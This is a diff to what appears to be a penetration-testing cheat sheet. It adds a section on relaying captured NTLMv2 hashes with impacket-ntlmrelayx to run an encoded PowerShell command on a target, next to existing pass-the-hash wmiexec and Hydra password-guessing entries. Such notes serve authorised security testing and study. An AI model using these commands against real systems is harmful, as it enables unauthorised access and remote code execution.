@@ -57,6 +57,13 @@ Impacket-wmiexec (executes as user)
 impacket-wmiexec -hashes 00000000000000000000000000000000:9a48310ea6f5fdfee955abed1762964b Administrator@10.10.10.42
 ```
 
+## Relaying a hash
+
+Start SMB server to catch NTLMv2, and when a connection occurs, relay NTLMv2 to the target, and execute a command on the target.
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.42 -c "powershell -enc JABj..."
+```
+
 ## Commands/Tools to guess passwords against network services  
 
 ### Hydra  
